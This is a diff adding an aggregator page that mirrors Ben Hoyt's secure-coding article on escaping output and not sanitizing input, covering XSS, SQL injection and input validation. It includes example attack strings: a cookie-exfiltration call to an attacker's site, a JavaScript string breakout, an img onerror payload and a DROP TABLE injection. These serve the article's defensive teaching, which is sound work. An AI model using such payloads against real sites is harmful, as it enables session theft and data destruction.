@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>
+Don&#x2019;t try to sanitize input. Escape output. - linksfor.dev(s)    </title>
+    <meta charset="utf-8">
+    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="google" value="notranslate">
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <meta property="og:title" content="Don&#x2019;t try to sanitize input. Escape output. - linksfor.dev(s)"/>
+    <meta property="article:author" content="Ben Hoyt"/>
+    <meta property="og:description" content="Why you should escape output correctly, but generally not sanitize user input."/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:url" content="https://benhoyt.com/writings/dont-sanitize-do-escape/"/>
+
+<meta property="og:site_name" content="linksfor.dev(s)" />
+</head>
+<body>
+    <div class="devring" style="background: #222">
+        <div style="text-align:center">Explore other dev related sites in this ring. If you would like to join this ring <a href="https://devring.club">click here</a>.</div>
+        <div class="grid">
+            <div style="display: grid; grid-template-columns: .5fr 1fr 1fr 1fr; text-align: center;">
+                <span class="devring-title"><a href="https://devring.club/">devring.club</a></span>
+                <a href="https://devring.club/sites/1/prev" class="devring-previous">Previous</a>
+                <a href="https://devring.club/random" class="devring-random">Random</a>
+                <a href="https://devring.club/sites/1/next" class="devring-next">Next</a>
+            </div>
+        </div>
+    </div>
+    <div class="grid">
+        <h1>
+<a href="/" style="color:inherit">linksfor.dev(s)</a>
+        </h1>
+        <title>linksfor.dev(s) - Don&#x2019;t try to sanitize input. Escape output.</title>
+<div class="readable">
+        <h1>Don&#x2019;t try to sanitize input. Escape output.</h1>
+            <div>by Ben Hoyt</div>
+            <div>Reading time: 7-9 minutes</div>
+        <div>Posted here: 27 Feb 2020</div>
+        <p><a href="https://benhoyt.com/writings/dont-sanitize-do-escape/">https://benhoyt.com/writings/dont-sanitize-do-escape/</a></p>
+        <hr/>
+<div id="readability-page-1" class="page"><div id="container">
+
+
+
+<div id="content">
+
+<p>February 2020</p>
+
+<p>Every so often developers talk about “sanitizing user input” to prevent cross-site scripting attacks. This is well-intentioned, but leads to a false sense of security, and sometimes mangles perfectly good input.</p>
+
+<h2 id="how-does-cross-site-scripting-happen">How does cross-site scripting happen?</h2>
+
+<p>A website is vulnerable to cross-site scripting (XSS) attacks if users can enter information that the site repeats back to them verbatim in a page’s HTML. This might cause minor issues (HTML that breaks the page layout) or major ones (JavaScript that sends the user’s login cookie to an attacker’s site).</p>
+
+<p>Let’s walk through a concrete example:</p>
+
+<ol>
+  <li>NaiveSite allows you to enter your name, which is output as is on your profile page.</li>
+  <li>Billy the Kid enters his name as <code>Billy &lt;script&gt;alert('Hello Bob!')&lt;/script&gt;</code>.</li>
+  <li>Anyone who visits Billy’s profile page gets some HTML including the unescaped <code>script</code> tag, which their browser runs.</li>
+  <li>If the <code>alert()</code> were changed to something more malicious, like <code>sendCookies('https://billy.com/cookie-monster')</code>, Billy may now be collecting the unsuspecting visitor’s login information.</li>
+</ol>
+
+<p>Side note: it isn’t quite this simple, as login cookies are usually marked <code>HttpOnly</code>, which means they’re not accessible to JavaScript. But this is NaiveSite, so it’s likely they made both an XSS mistake and a cookie one.</p>
+
+<h2 id="why-input-filtering-isnt-a-great-idea">Why input filtering isn’t a great idea</h2>
+
+<p>The developer has heard of “input filtering” or “sanitizing input”, so they write some code to strip out unsafe HTML characters <code>&lt;&gt;&amp;</code> from the name before storing it. Problem solved!</p>
+
+<p>But there are two problems with this. For one, a couple might sign up to NaiveSite as <code>Bob&nbsp;&amp;&nbsp;Jane&nbsp;Smith</code>, but the filtering code strips the <code>&amp;</code>, and suddenly Bob is on his own, with a middle name of Jane.</p>
+
+<p>Or if the filter is a bit more zealous and also strips <code>'</code> and <code>"</code>, someone like Bill O’Brien becomes Bill OBrien. Messing up <a href="https://www.kalzumeus.com/2010/06/17/falsehoods-programmers-believe-about-names/">people’s names</a> is not a good look.</p>
+
+<p>Perhaps more importantly, it gives a false sense of security. What does “unsafe” mean? In what context? Sure, <code>&lt;&gt;&amp;</code> are unsafe characters for HTML, but what about CSS, JSON, SQL, or even shell scripts? Those have a completely different set of unsafe characters.</p>
+
+<p>For example, NaiveSite might have a PHP template that looks like this:</p>
+
+<div><div><pre><code><span>&lt;html&gt;</span>
+...
+<span>&lt;script&gt;</span>
+<span>var</span> <span>name</span> <span>=</span> <span>"</span><span>&lt;?=$name?&gt;</span><span>"</span><span>;</span>
+<span>&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>If an attacker sets their name to include double quotes, like <code>"; badFunc(); "</code>, they can run arbitrary JavaScript on any NaiveSite pages that display the user’s name (which, if you’re logged in, is probably all of them).</p>
+
+<p>Another example of this kind of thing is SQL injection, an attack that’s closely related to cross-site scripting. NaiveSite is powered by MySQL, and it finds users like so:</p>
+
+<div><div><pre><code><span>$query</span> <span>=</span> <span>"SELECT * FROM users WHERE name = '</span><span>{</span><span>$name</span><span>}</span><span>'"</span>
+</code></pre></div></div>
+
+<p>When a boy named <a href="https://xkcd.com/327/"><code>Robert'); DROP TABLE users;</code></a> comes along, NaiveSite’s entire user database is deleted. Oops!</p>
+
+<p>Incidentally, the mother in the xkcd comic says, “I hope you’ve learned to sanitize your database inputs.” Which is somewhat confusing, but I’ll give Randall the benefit of the doubt and assume he meant “escape your database parameters”.</p>
+
+<p>In short, it’s no good to strip out “dangerous characters”, because some characters are dangerous in some contexts and perfectly safe in others.</p>
+
+<h2 id="escape-your-output-instead">Escape your output instead</h2>
+
+<p>The only code that knows what characters are dangerous is the code that’s outputting in a given context.</p>
+
+<p>So the better approach is to store whatever name the user enters verbatim, and then have the template system HTML-escape when outputting HTML, or properly escape JSON when outputting JSON and JavaScript.</p>
+
+<p>And of course use your SQL engine’s parameterized query features so it properly escapes variables when building SQL:</p>
+
+<div><div><pre><code><span>$stmt</span> <span>=</span> <span>$db</span><span>-&gt;</span><span>prepare</span><span>(</span><span>'SELECT * FROM users WHERE name = ?'</span><span>);</span>
+<span>$stmt</span><span>-&gt;</span><span>bind_param</span><span>(</span><span>'s'</span><span>,</span> <span>$name</span><span>);</span>
+</code></pre></div></div>
+
+<p>This is sometimes called “contextual escaping”. If you happen to use Go’s <a href="https://golang.org/pkg/html/template/"><code>html/template</code></a> package, you get automatic contextual escaping for HTML, CSS, and JavaScript. Most other templating systems at least give you automatic HTML escaping, for example React, Jinja2, and Rails templates.</p>
+
+<h2 id="but-what-if-you-want-raw-input">But what if you <em>want</em> raw input?</h2>
+
+<p>One tricky situation is when your app’s purpose is allowing a user to enter HTML or Markdown for display. In this case you can’t escape when rendering output, because the whole purpose is to allow users to add links, images, headings, etc.</p>
+
+<p>So you have to take a different approach. If you’re using Markdown, you can either:</p>
+
+<ol>
+  <li>Allow them to only enter pure Markdown, and convert that to HTML on render (many Markdown libraries allow raw HTML by default; be sure to disable that). This is the most secure option, but also more restrictive.</li>
+  <li>Allow them to use HTML in the Markdown, but only a whitelist of allowed tags and attributes, such as <code>&lt;a href="..."&gt;</code> and <code>&lt;img src="..."&gt;</code>. Both <a href="https://meta.stackexchange.com/a/135909/160696">Stack Exchange</a> and <a href="https://github.github.com/gfm/#disallowed-raw-html-extension-">GitHub</a> take this second approach.</li>
+</ol>
+
+<p>If you’re not using Markdown but want to let your users enter HTML directly, you only have the second option – you must filter using a whitelist. This is harder to get right than you’d think (for example, <code>&lt;img src="x" onerror="badFunc()"&gt;</code>), so be sure to use a mature, security-vetted library like <a href="https://github.com/cure53/DOMPurify">DOMPurify</a>.</p>
+
+<p>So in cases where you do need to “echo” raw user input, carefully filter input based on a restrictive whitelist, and store the result in the database. When you come to output it, output it as stored without escaping.</p>
+
+<p>The parallel for SQL injection might be if you’re building a data charting tool that allows users to enter arbitrary SQL queries. You might want to allow them to enter <code>SELECT</code> queries but not data-modification queries. In these cases you’re best off using a proper SQL parser (<a href="https://github.com/xwb1989/sqlparser">like this one</a>) to ensure it’s a well-formed <code>SELECT</code> query – but doing this correctly is not trivial, so be sure to get security review.</p>
+
+<h2 id="what-about-validation">What about validation?</h2>
+
+<p>Input sanitization is usually a bad idea, but input <em>validation</em> is a good thing.</p>
+
+<p>For example, when you’re parsing form fields, and you have a number field that’s not a number, or an email address without an <code>@</code>, or a “post status” drop-down that can only be one of <code>draft</code>, <code>published</code>, or <code>archived</code> – then by all means validate it and return an error if it’s invalid.</p>
+
+<p>Good web form validation shows errors inline so the user knows exactly what to fix:</p>
+
+<p><img src="https://benhoyt.com/images/form-validation.png" alt="Web form validation"></p>
+
+<p>You must do validation at least on the backend, otherwise an attacker could bypass the frontend validation and <code>POST</code> bogus data to your endpoint directly. In addition, you can also validate early on the frontend to show errors more real-time, without a round trip to the server.</p>
+
+<h2 id="further-reading">Further reading</h2>
+
+<p>OWASP has two cheat sheets on <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet">Cross Site Scripting Prevention</a> and <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">SQL Injection Prevention</a> that contain a lot of further information on escaping.</p>
+
+<p>There’s also a StackOverflow <a href="https://stackoverflow.com/questions/129677/how-can-i-sanitize-user-input-with-php/130323#130323">answer to “How can I sanitize user input with PHP?”</a> that is somewhat PHP-specific, but I found it succinct and helpful. It links to a page on PHP <a href="https://www.php.net/manual/en/security.magicquotes.php">magic quotes</a>, which were a bad idea and actually removed in PHP 5.4 – the discussion there is very much in line with what I’ve written above.</p>
+
+<p>If you have any feedback on this article, please get in touch! Or see the comments on <a href="https://news.ycombinator.com/item?id=22431022">Hacker News</a> and <a href="https://www.reddit.com/r/programming/comments/fa7rn8/dont_try_to_sanitize_input_escape_output/">programming reddit</a>.</p>
+
+</div>
+
+</div></div></div>
+    </div>
+    <footer>
+        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
+        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
+        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
+        <div>Customer satisfaction guaranteed to be optional.</div>
+    </footer>
+    
+    <script async defer>
+        _dna = window._dna || {};
+        _dna.siteId = "linksfor.devs";
+        _dna.outlink = true;
+
+        (function() {
+            let dna = document.createElement('script');
+            dna.type = 'text/javascript';
+            dna.async = true;
+            dna.src = '//dna.buildstarted.com/t.js';
+            let s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(dna, s);
+        })();
+    </script>
+    <noscript><img src="//dna.buildstarted.com/g?siteId=linksfor.devs"/></noscript>
+</body>
+</html>
